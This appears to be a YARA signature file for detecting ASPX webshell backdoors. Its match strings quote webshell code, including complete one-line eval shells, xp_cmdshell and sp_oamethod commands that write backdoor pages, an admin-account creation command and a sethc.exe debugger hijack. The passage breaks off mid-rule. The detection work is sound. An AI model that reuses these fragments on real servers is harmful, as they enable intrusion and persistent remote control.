        date = "2018-5-28"
        hash1 = "378b4a644f60d3e469486ec4ee1911330b36323185b82e1a3b96a1ec8e795638"
    strings:
        $s1 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + Path.GetFileName(file));" fullword ascii
        $s2 = "response.Append(\"<tr><td>file&nbsp;<a href=\\\"?file=\" + fileInfo.FullName + \"&authkey=\" + Request.Params[\"authkey" fullword ascii
        $s3 = "response.Append(\"<tr><td>dir&nbsp;&nbsp;<a href=\\\"?directory=\" + dirs.FullName + \"&authkey=\" + Request.Params[\"a" fullword ascii
        $s4 = "\"] + \"&operation=download\\\">\" + fileInfo.FullName + \"</a></td><td>\");" fullword ascii
        $s5 = "response.Append(@\"<td><asp:TextBox id=\"\"txtAuthKey\"\" runat=\"\"server\"\"></asp:TextBox></td>\");" fullword ascii
        $s6 = "response.Append(\"<tr><td>file&nbsp;<a href=\\\"?file=\" + fileInfo.FullName + \"&authkey=\" + Request.Params[\"authkey\"] + \"&" ascii
        $s7 = "Response.AddHeader(\"Content-Length\", new FileInfo(file).Length.ToString());" fullword ascii
        $s8 = "uthkey\"] + \"&operation=list\\\">\" + dirs.FullName + \"</a></td></tr>\");" fullword ascii
        $s9 = "response.Append(\"&authkey=\" + Request.Params[\"authkey\"]);" fullword ascii
        $s10 = "string[] tempDrives = Environment.GetLogicalDrives();" fullword ascii
        $s11 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
        $s12 = "response.Append(\"<tr><td>dir&nbsp;&nbsp;<a href=\\\"?directory=\" + dirs.FullName + \"&authkey=\" + Request.Params[\"authkey\"]" ascii
        $s13 = "foreach (System.IO.DirectoryInfo dirs in dirInfo.GetDirectories(\"*.*\"))" fullword ascii
        $s14 = "if (Request.Params[\"operation\"] == \"download\")" fullword ascii
        $s15 = "foreach (System.IO.FileInfo fileInfo in dirInfo.GetFiles(\"*.*\"))" fullword ascii
        $s16 = "private const string AUTHKEY = \"woanware\";" fullword ascii
        $s17 = "for (int index = 0; index < tempDrives.Length; index++)" fullword ascii
        $s18 = "Response.Write(this.DownloadFile());" fullword ascii
        $s19 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s20 = "response.Append(\"&operation=list\\\">\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule sig_570d825366e3b99ece761a8a874b0dbaf21e9fb8
{
    meta:
        description = "aspx - file 570d825366e3b99ece761a8a874b0dbaf21e9fb8.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b3cd4bcba693e88f2381b986009007f2c12c0f5eb9b4bee833a1030955cf76d2"
    strings:
        $s1 = "System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding(\"gb2312\"));" fullword ascii
        $s2 = "System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding(\"gb23" fullword ascii
        $s3 = ":<asp:TextBox runat=\"server\" ID=\"txtContext\" Width=\"400px\" Height=\"250px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii
        $s4 = "if (password.Equals(this.txtPass.Text))" fullword ascii
        $s5 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii
        $s6 = ":<asp:TextBox runat=\"server\" ID=\"txtPath\" Width=\"400px\" ></asp:TextBox>" fullword ascii
        $s7 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii
        $s8 = "string password = \"Seayace\";" fullword ascii
        $s9 = "<asp:Button runat=\"server\" ID=\"btnUpload\" text=\"" fullword ascii
        $s10 = ":<asp:Label runat=\"server\" ID=\"lblthispath\" Text=\"\"></asp:Label>" fullword ascii
        $s11 = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" validateRequest=\"false\"%>" fullword ascii
        $s12 = "<script language=\"c#\" runat=\"server\">" fullword ascii
        $s13 = "void btnUpload_Click(object sender, EventArgs e)" fullword ascii
        $s14 = "sw.Write(this.txtContext.Text);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule ed5938c04f61795834751d44a383f8ca0ceac833
{
    meta:
        description = "aspx - file ed5938c04f61795834751d44a383f8ca0ceac833.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "883986581a7f0a3dd4b2af35aa880957e9dee92019fc7e3a046328a99682ed56"
    strings:
        $s1 = "this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+pack" fullword ascii
        $s2 = "this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thread i" fullword ascii
        $s3 = "logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
        $s4 = "if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
        $s5 = "if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
        $s6 = "proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
        $s7 = "<a href=\" http://user.qzone.qq.com/356497021\">1</a> " fullword ascii
        $s8 = "<a href=\"http://user.qzone.qq.com/356497021\">2</a> " fullword ascii
        $s9 = "<asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
        $s10 = "<div id=b>Powered by <a href=\"//user.qzone.qq.com/356497021\"> " fullword ascii
        $s11 = "System.DateTime nextDay = System.DateTime.Now.AddDays(1);" fullword ascii
        $s12 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
        $s13 = "mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);" fullword ascii
        $s14 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
        $s15 = "static DateTime stoptime = System.DateTime.Now.AddYears(-8);" fullword ascii
        $s16 = "<asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
        $s17 = "<asp:TextBox ID=\"txtport\" Text=\"0\"  width=\"90%\" runat=\"server\"></asp:TextBox>" fullword ascii
        $s18 = "if (!logIt && my_s_http_post)" fullword ascii
        $s19 = "mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);" fullword ascii
        $s20 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule cd31b8ccd8c3c09323da2de6ee1d8f27898d7105
{
    meta:
        description = "aspx - file cd31b8ccd8c3c09323da2de6ee1d8f27898d7105.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b65192804e804dccd154ec4540c79c948414d71f6efa7c63efd1eaa9e09fee3d"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"g\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_22345e956bce23304f5e8e356c423cee60b0912c
{
    meta:
        description = "aspx - file 22345e956bce23304f5e8e356c423cee60b0912c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "da0e5f7af9c96c2c8d2ba72b393dce05df1ba0bac746010a380a1f0eb11de6d7"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_5c7aebfb84eba90811d14b196bd488dcac0face3
{
    meta:
        description = "aspx - file 5c7aebfb84eba90811d14b196bd488dcac0face3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "79ba534b77d74ede71d6e5cf939154331bb30bade9c28e4ebc5f00718cd67ee0"
    strings:
        $s1 = "<msxsl:assembly name=\"\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
        $s2 = "<msxsl:assembly name=\"\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
        $s3 = "<msxsl:assembly name=\"\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
        $s4 = "<msxsl:assembly name=\"\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
        $s5 = "<xsl:template match=\"\"/root\"\">" fullword ascii
        $s6 = "<%@ import Namespace=\"System.Xml.Xsl\"%>" fullword ascii
        $s7 = "string xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";" fullword ascii
        $s8 = "<%@ import Namespace=\"System.Xml\"%>" fullword ascii
        $s9 = "eval(Request.Item['a'],'unsafe');Response.End();}]]>" fullword ascii
        $s10 = "<msxsl:script language=\"\"JScript\"\" implements-prefix=\"\"zcg\"\">" fullword ascii
        $s11 = "<![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;" ascii
        $s12 = "xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());" fullword ascii
        $s13 = "XslCompiledTransform xct=new XslCompiledTransform();" fullword ascii
        $s14 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
        $s15 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
        $s16 = "<![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;" ascii
        $s17 = "xct.Transform(xmldoc,null,new MemoryStream());" fullword ascii
        $s18 = "string xslt=@\"<?xml version='1.0'?>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule df68ea115a1bb71bc2f17c05df0e4be5cb273503
{
    meta:
        description = "aspx - file df68ea115a1bb71bc2f17c05df0e4be5cb273503.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "78aee68bbd818cebb3d2621594522ab17d7b95ad5b0e81cdd82d17906c5ac4eb"
    strings:
        $x1 = "\" CssClass=\"bt\" OnClick=\"BGY\"/></p><div id=\"dQIIF\" runat=\"server\"><div id=\"irTU\" runat=\"server\"></div><div id=\"uXe" ascii
        $x2 = "ethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:Lis" ascii
        $x3 = ">>\";}protected void OUj(){if(Dtdr.State==ConnectionState.Closed){try{Dtdr.ConnectionString=MasR.Text;Kkvb.Connection=Dtdr;Dtdr." ascii
        $x4 = ".mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create table [" ascii
        $x5 = ">>\";}protected void FbhN(object sender,EventArgs e){try{Process ahAE=new Process();ahAE.StartInfo.FileName=kusi.Value;ahAE.Star" ascii
        $x6 = "<%@ Page Language=\"C#\" Debug=\"true\" trace=\"false\" validateRequest=\"false\" EnableViewStateMac=\"false\" EnableViewState=" ascii
        $x7 = ">>\";WICxe();VNR.Visible=true;AdCx();}protected void DGCoW(object sender,EventArgs e){try{StreamWriter sw;if(NdCX.SelectedItem.T" ascii
        $x8 = "rite3\\httpd.conf<br>\");yRwc.Append(@\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\");yRwc.Append(@\"DU Meter" fullword ascii
        $x9 = ">>\";WICxe();zRyG.Visible=true;QiFB.Value=AXSbb.Value+path;lICp.Value=AXSbb.Value;pWVL.Value=AXSbb.Value+path;string Att=File.Ge" ascii
        $s10 = "k.com\"  target=\"_blank\"><font color=\"#FF154\">im4hk</font> </a><br></br>PassWord:<br></br><asp:TextBox ID=\"HRJ\" runat=\"se" ascii
        $s11 = ":<br>\");yRwc.Append(@\"C:\\WINDOWS\\system32\\Macromed\\Flash\\Flash10q.ocx<br>\");yRwc.Append(@\"IISrewrite3 " fullword ascii
        $s12 = "FileAttributes.System);}if(ccB.Checked){File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);}if(fbyZ.Check" fullword ascii
        $s13 = ">>\";}public class PortForward{public string Localaddress;public int LocalPort;public string RemoteAddress;public int RemotePort" ascii
        $s14 = ">>\";WICxe();DCbS.Visible=true;int UEbTI=0;DataTable dt=cCf(\"Win32_Process\");for(int j=0;j<dt.Rows.Count;j++){UEbTI++;string b" ascii
        $s15 = ".4.0;Data Source=E:\\database.mdb\">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID=\"QcZPA\" runat=\"server\" Text=\"" fullword ascii
        $s16 = ">>\";krIR(AXSbb.Value);}public void fhAEn(){try{string[] YRgt=Directory.GetLogicalDrives();SJdQ=Ebgw(\"aHR0cDovL3dlYnNhZmUuZmFjY" ascii
        $s17 = "tem Value=\"sp_makewebtask @outputfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">S" ascii
        $s18 = "ate','odsole70.dll')\">Add sp_oacreate</asp:ListItem><asp:ListItem Value=\"Exec sp_configure 'show advanced options',1;RECONFIGU" ascii
        $s19 = ":<br/> <input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" ascii
        $s20 = "bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\\1.asp" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule dbbcc246a92e7d8cb91d2dfb181441d192fdb661
{
    meta:
        description = "aspx - file dbbcc246a92e7d8cb91d2dfb181441d192fdb661.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c23a8ab4ed9d2dc524c0b97a5f1db3bb163f0fc4a3ee8cf4c3939cc4f03ee6ac"
    strings:
        $x1 = "<meta content=\"http://schemas.microsoft.com/intellisense/ie5\" name=\"vs_targetSchema\">" fullword ascii
        $s2 = "<meta content=\"Microsoft Visual Studio .NET 7.1\" name=\"GENERATOR\">" fullword ascii
        $s3 = "<asp:Label id=\"L4\" style=\"Z-INDEX: 107; LEFT: 144px; POSITION: absolute; TOP: 24px\" runat=\"server\"" fullword ascii
        $s4 = "<asp:Label id=\"L1\" style=\"Z-INDEX: 101; LEFT: 24px; POSITION: absolute; TOP: 96px\" runat=\"server\">" fullword ascii
        $s5 = "<asp:Button id=\"Button1\" style=\"Z-INDEX: 106; LEFT: 424px; POSITION: absolute; TOP: 504px\" runat=\"server\"" fullword ascii
        $s6 = "<asp:Label id=\"L2\" style=\"Z-INDEX: 103; LEFT: 24px; POSITION: absolute; TOP: 64px\" runat=\"server\">" fullword ascii
        $s7 = "<asp:Label id=\"L3\" style=\"Z-INDEX: 104; LEFT: 144px; POSITION: absolute; TOP: 96px\" runat=\"server\"" fullword ascii
        $s8 = "<asp:TextBox id=\"T1\" style=\"Z-INDEX: 102; LEFT: 144px; POSITION: absolute; TOP: 64px\" runat=\"server\"" fullword ascii
        $s9 = "<asp:TextBox id=\"T2\" style=\"Z-INDEX: 105; LEFT: 24px; POSITION: absolute; TOP: 128px\" runat=\"server\"" fullword ascii
        $s10 = "<meta content=\"JavaScript\" name=\"vs_defaultClientScript\">" fullword ascii
        $s11 = "System.IO.FileInfo fil = new System.IO.FileInfo(T1.Text);" fullword ascii
        $s12 = "<meta content=\"C#\" name=\"CODE_LANGUAGE\">" fullword ascii
        $s13 = "void Button1_Click(object sender, System.EventArgs e)" fullword ascii
        $s14 = "void Page_Load(object sender, System.EventArgs e)" fullword ascii
        $s15 = "System.IO.StreamWriter sw = fil.CreateText();" fullword ascii
        $s16 = "Width=\"504px\" Height=\"344px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii
        $s17 = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" >" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 5KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ed9223d6bc9aff96379ee74992f41bb2bf121f39
{
    meta:
        description = "aspx - file ed9223d6bc9aff96379ee74992f41bb2bf121f39.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "331d081d6fa2241b5b695dffcdf830d9bcd52d97a472057168a4a487215f805b"
    strings:
        $s1 = "if (str.IndexOf(\":\\\\\") != -1 && str.IndexOf(\"c:\\\\program files\") == -1 && str.IndexOf(\"c:\\\\windows\") == -1)" fullword ascii
        $s2 = "if (str.IndexOf(\":\\\\\") != -1 && str.IndexOf(\"c:\\\\program files\") == -1 && str.IndexOf(\"c:\\\\windows\")" fullword ascii
        $s3 = "list.Add(temp + \"\\\\\");" fullword ascii
        $s4 = "if (list.IndexOf(temp + \"\\\\\") == -1)" fullword ascii
        $s5 = "Response.Write(temp + \"<br/>\");" fullword ascii
        $s6 = "Response.Write(temp + \"\\\\<br/>\");" fullword ascii
        $s7 = "while (temp.IndexOf(\"\\\\\") != -1)" fullword ascii
        $s8 = "list.Add(temp);" fullword ascii
        $s9 = "if (list.IndexOf(temp) == -1)" fullword ascii
        $s10 = "sack.Push(Registry.Users);" fullword ascii
        $s11 = "temp = temp.Substring(0, temp.LastIndexOf(\"\\\\\"));" fullword ascii
        $s12 = "Regex regImg = new Regex(\"[a-z|A-Z]{1}:\\\\\\\\[a-z|A-Z| |0-9|\\u4e00-\\u9fa5|\\\\~|\\\\\\\\|_|{|}|\\\\.]*\");" fullword ascii
        $s13 = "string[] keys = Hklm.GetSubKeyNames();" fullword ascii
        $s14 = "<%@ import Namespace=\"System.Collections.Generic\"%>" fullword ascii
        $s15 = "RegistryKey Hklm = (RegistryKey)sack.Pop();" fullword ascii
        $s16 = "string str = Hklm.GetValue(name).ToString().ToLower();" fullword ascii
        $s17 = "<%@ import Namespace=\"System.Collections\" %>" fullword ascii
        $s18 = "if (!temp.EndsWith(\"\\\\\"))" fullword ascii
        $s19 = "sack.Push(Registry.CurrentUser);" fullword ascii
        $s20 = "sack.Push(Registry.CurrentConfig);" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_479c1e1f1c263abe339de8be99806c733da4e8c1
{
    meta:
        description = "aspx - file 479c1e1f1c263abe339de8be99806c733da4e8c1.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "101b592cb8850e208c63be29c776fe221f36314e403b7b2d89b31bdcd4ad7b4b"
    strings:
        $s1 = "https://github.com/sensepost/reGeorg" fullword ascii
        $s2 = "String cmd = Request.QueryString.Get(\"cmd\").ToUpper();" fullword ascii
        $s3 = "etienne@sensepost.com / @kamp_staaldraad" fullword ascii
        $s4 = "String target = Request.QueryString.Get(\"target\").ToUpper();" fullword ascii
        $s5 = "System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);" fullword ascii
        $s6 = "int port = int.Parse(Request.QueryString.Get(\"port\"));" fullword ascii
        $s7 = "sam@sensepost.com / @trowalts" fullword ascii
        $s8 = "willem@sensepost.com / @_w_m__" fullword ascii
        $s9 = "//String cmd = Request.Headers.Get(\"X-CMD\");" fullword ascii
        $s10 = "IPAddress ip = IPAddress.Parse(target);" fullword ascii
        $s11 = "Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);" fullword ascii
        $s12 = "//Request.Headers.Get(\"X-TARGET\");" fullword ascii
        $s13 = "Response.AddHeader(\"X-ERROR\", exKak.Message);" fullword ascii
        $s14 = "Response.AddHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
        $s15 = "Response.AddHeader(\"X-ERROR\", ex.Message);" fullword ascii
        $s16 = "//Request.Headers.Get(\"X-PORT\"));" fullword ascii
        $s17 = "else if (cmd == \"FORWARD\")" fullword ascii
        $s18 = "Session.Add(\"socket\", sender);" fullword ascii
        $s19 = "Response.AddHeader(\"X-STATUS\", \"OK\");" fullword ascii
        $s20 = "if (Request.HttpMethod == \"POST\")" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _216c1dd950e0718e35bc4834c5abdc2229de3612_9449e3c50d1f504070d94935dc5783f6439ca472_d89eb9e20fe2083faf35bd2be00071d11e85df06__0
{
    meta:
        description = "aspx - from files 216c1dd950e0718e35bc4834c5abdc2229de3612.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2818481cbcbc4c7d8ff882581a7ff20ffdf5d9b8f3c64a51770541c11c6985a5"
        hash2 = "22a4713ee6ea513dd91915e15eda0892a239efaa89bcf81a9e3e947acacf5006"
        hash3 = "e9465c7dff9e79d4d9d05d016cf86bdd9959729707ca59ef1cfc6272d517a573"
        hash4 = "4d2c5711a8f2d45d1aeadde69fa81fbfe7378794344e0fa31949ac6fd633271a"
        hash5 = "8b2a61f29fdeda908d299515975a4dd3abd1a7508dbe8487bcb2a56fad2ec16f"
    strings:
        $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
        $x2 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32\\\\ias\\\\ias" ascii
        $x3 = "ion\\\\Image File Execution Options\\\\sethc.exe','debugger','REG_SZ','c:\\\\windows\\\\explorer.exe' \";" fullword ascii
        $x4 = "SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
        $x5 = "Response.AddHeader (\"Content-Disposition\",\"attachment;filename=\" + HttpUtility.UrlEncode (fi.Name,System.Text.En" fullword ascii
        $x6 = "<asp:TextBox ID=\"cmdurl\" runat=\"server\" Width=\"320px\" Font-Size=\"12px\">cmd.exe</asp:TextBox></td>" fullword ascii
        $x7 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x8 = "agentcmd.ExecuteNonQuery();" fullword ascii
        $x9 = "SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
        $x10 = "SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
        $x11 = "SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
        $x12 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32" fullword ascii
        $x13 = "SqlConnection getpconn = new SqlConnection(\"server=.\" + oportstr + \";User ID=\" + osqlnamestr + \";Password=\" + osqlpassst" fullword ascii
        $x14 = "string connstrs = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim() + \";d" fullword ascii
        $x15 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x16 = "string connstr = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim(" fullword ascii
        $x17 = "getocmd.ExecuteNonQuery();           " fullword ascii
        $x18 = "SqlConnection conn = new SqlConnection(\"server=.\" + kp + \";User ID=\" + kusqlname.Text + \";Password=\" + kusqlpass.Tex" fullword ascii
        $x19 = "File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.System);" fullword ascii
        $x20 = "string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image" ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule _019eb61a6b5046502808fb5ab2925be65c0539b4_543b1760d424aa694de61e6eb6b3b959dee746c2_a91320483df0178eb3cafea830c1bd94585fc896__1
{
    meta:
        description = "aspx - from files 019eb61a6b5046502808fb5ab2925be65c0539b4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0ea1ec937dd7ada5c804f3448eb6d725ded32da469fc4847e23ba2e738411bf4"
        hash2 = "e177b10b6508f4f80cdfc5db5efee2594f29661889869b7759fd7de6b3b809ac"
        hash3 = "b96628b36911fce4ffa18cc10ba36d1dbd260f638c18b60e73f484c09ef0be09"
        hash4 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
        hash5 = "d8f79f3f185fe10f8598b5d88fd55219d809856150fd693347b32d7df6ad6999"
    strings:
        $x1 = "Bin_ExecSql(\"EXEC master..xp_cmdshell 'echo \" + substrfrm + \" >> c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x2 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
        $x3 = "Bin_ExecSql(\"EXECUTE master..xp_cmdshell 'del c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x4 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));" fullword ascii
        $x5 = "<asp:LinkButton ID=\"Bin_Button_Logout\" runat=\"server\" OnClick=\"Bin_Button_Logout_Click\" Text=\"Logout\" ></asp:LinkButton>" ascii
        $x6 = "foreach(ManagementObject p in Bin_WmiQuery(\"root\\\\CIMV2\",\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
        $x7 = "return string.Format(\"<a href=\\\"javascript:Bin_PostBack('zcg_KillProcess','{0}')\\\">Kill</a>\",pid);" fullword ascii
        $s8 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
        $s9 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
        $s10 = "Bin_ExecSql(\"If object_id('bin_temp')is not null drop table bin_temp\");" fullword ascii
        $s11 = "else{Bin_Lable_File.PostedFile.SaveAs(uppath+Path.GetFileName(Bin_Lable_File.Value));Bin_Msg(\"File upload success!\");}" fullword ascii
        $s12 = "try{Bin_Wmi_GetProcess();}catch{try{Bin_GetProcess();}catch(Exception ex){zcg_ShowError(ex);}}" fullword ascii
        $s13 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('Bin_KillMe','');};\";" fullword ascii
        $s14 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+Bin_ToBase64(rootkey)+\"')\\\">\"+rootkey+\"</a>\";" fullword ascii
        $s15 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+Bin_ToBase64(ParPath)+\"')\\\">Parent Key</a>\";" fullword ascii
        $s16 = "<div id=\"Bin_Div_Login\" runat=\"server\" style=\" margin:15px\" enableviewstate=\"false\" visible=\"false\" >" fullword ascii
        $s17 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright(C)2006-2014 <a hre" ascii
        $s18 = "string res = Bin_DataTable(\"EXECUTE master..xp_fileexist '\" + Bin_TextBox_SavePath.Value + \"'\").Rows[0][0].ToString();" fullword ascii
        $s19 = "comm.CommandText = \"insert into [bin_temp] values(@P1);\";" fullword ascii
        $s20 = "ServiceController[] objsrv=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _175752ec67bdce90bcd083edbb5a21b61887b869_3fc22d06033adc1f4e99a1de10b5c34351e198f8_2
{
    meta:
        description = "aspx - from files 175752ec67bdce90bcd083edbb5a21b61887b869.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "814044d84f4fa7b29b1459a8caed4fd0fa5d3d75a623078881faba33e968534a"
        hash2 = "73c99b46c973b605d3a9d7b288ffc70c6a62cbf620ccd99b0c44876c77f8bd6e"
    strings:
        $x1 = "Private Declare Auto Function SHGetFileInfo Lib \"shell32.dll\" ( _" fullword ascii
        $s2 = "Dim shell_fake_name As String = \"Server Logging System\"" fullword ascii
